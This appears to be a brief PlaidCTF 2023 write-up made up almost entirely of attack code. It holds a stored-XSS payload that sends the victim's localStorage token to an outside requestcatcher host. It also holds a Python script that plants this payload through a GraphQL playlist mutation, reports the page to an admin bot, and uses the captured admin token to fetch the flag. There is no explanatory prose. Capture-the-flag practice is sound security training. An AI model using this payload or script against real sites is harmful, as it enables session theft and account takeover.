# PlaidCTF 2023 Writeup

> 原文: https://www.ctfiot.com/108761.html
> ID: 108761


```
<img src=x onerror="fetch(`https://yours.requestcatcher.com/test`,{method:`POST`,body:`${localStorage.token}`})">
```



```
import requests
import random
import string

def get_random_string(length):
 return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

host = 'http://[yours].dubs.putlocker.chal.pwni.ng:20002'
username = get_random_string(10)
password = get_random_string(10)

def send_graphql(op_name, query, token=None):
 sent_json = {
 "operationName":op_name,
 "variables":{},
 "query":query
 }
 headers = {} if token is None else {'authorization': token}

 return requests.post(f'{host}/graphql', json=sent_json, headers=headers).json()

token = send_graphql("Register", "mutation Register { register(name: \""+username+"\", password: \"" + password + "\")}")['data']['register']
print(token)

playlist_id = send_graphql("CreatePlaylist", "mutation CreatePlaylist { createPlaylist( name: \"attack!\" description: \"<img src=x onerror=\\\"fetch(`https://yours.requestcatcher.com/test`,{method:`POST`,body:`${localStorage.token}`})\\\">\" ) { id __typename }}", token)
playlist_id = playlist_id['data']['createPlaylist']['id']
print(playlist_id)

user_id = send_graphql("PlaylistQuery", "query PlaylistQuery {\n playlist(id: \"" + playlist_id + "\") {\n id\n name\n description\n episodes {\n id\n name\n __typename\n }\n owner {\n id\n name\n __typename\n }\n __typename\n }\n}", token)
user_id = user_id['data']['playlist']['owner']['id']

sent_url = host + '/user/' + user_id
print(sent_url)
send_graphql("Report", "mutation Report {\n report(\n url: \"" + sent_url + "\"\n )\n}", token)

admin_token = input('Enter admin_token: ')

print(send_graphql("Flag", "mutation Flag {\n flag}", admin_token))
```
